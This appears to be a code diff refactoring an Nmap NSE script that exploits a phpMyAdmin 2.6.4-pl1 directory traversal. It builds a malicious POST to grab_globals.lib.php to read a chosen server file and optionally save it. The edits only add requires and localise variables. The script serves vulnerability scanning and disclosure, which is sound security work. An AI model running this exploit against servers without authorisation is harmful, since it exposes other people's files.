@@ -1,6 +1,8 @@
 local shortport = require "shortport"
 local stdnse = require "stdnse"
+local string = require "string"
 local http = require "http"
+local io = require "io"
 local vulns = require "vulns"
 
 description = [[
@@ -92,12 +94,11 @@ local DEFAULT_DIR = "/phpMyAdmin-2.6.4-pl1/"
 local EXPLOIT_PATH = "libraries/grab_globals.lib.php"
 
 action = function(host, port)
-	local response, dir, file
-	dir = stdnse.get_script_args("http-phpmyadmin-dir-traversal.dir") or DEFAULT_DIR
-	evil_uri = dir..EXPLOIT_PATH
-	rfile = stdnse.get_script_args("http-phpmyadmin-dir-traversal.file") or DEFAULT_FILE
-	evil_postdata = EXPLOIT_QUERY:format(rfile)
-	filewrite = stdnse.get_script_args(SCRIPT_NAME..".outfile")
+	local dir = stdnse.get_script_args("http-phpmyadmin-dir-traversal.dir") or DEFAULT_DIR
+	local evil_uri = dir..EXPLOIT_PATH
+	local rfile = stdnse.get_script_args("http-phpmyadmin-dir-traversal.file") or DEFAULT_FILE
+	local evil_postdata = EXPLOIT_QUERY:format(rfile)
+	local filewrite = stdnse.get_script_args(SCRIPT_NAME..".outfile")
 	stdnse.print_debug(1, "%s: HTTP POST %s%s", SCRIPT_NAME, stdnse.get_hostname(host), evil_uri)
 	stdnse.print_debug(1, "%s: POST DATA %s", SCRIPT_NAME, evil_postdata)
 
@@ -117,7 +118,7 @@ action = function(host, port)
 	}
 	local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
 	
-	response = http.post(host, port, evil_uri, 
+	local response = http.post(host, port, evil_uri,
 		{header = {["Content-Type"] = "application/x-www-form-urlencoded"}}, nil, evil_postdata)
 	if response.body and response.status==200 then
 		stdnse.print_debug(1, "%s: response : %s", SCRIPT_NAME, response.body)
